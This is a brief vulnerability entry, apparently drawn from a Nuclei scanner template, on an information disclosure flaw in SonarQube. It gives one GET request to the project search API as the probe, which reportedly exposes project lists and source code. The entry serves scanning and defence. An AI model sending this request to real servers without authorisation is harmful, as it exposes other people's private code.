# Vulnerability: SonarQube - Information Disclosure
**Classification:** SONARQUBE
**Source:** Nuclei Template (`sonarqube-projects-disclosure.yaml`)

## Description
Information leakage vulnerability in an interface of SonarQube, you can download the source code through the tool.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/components/search_projects
```

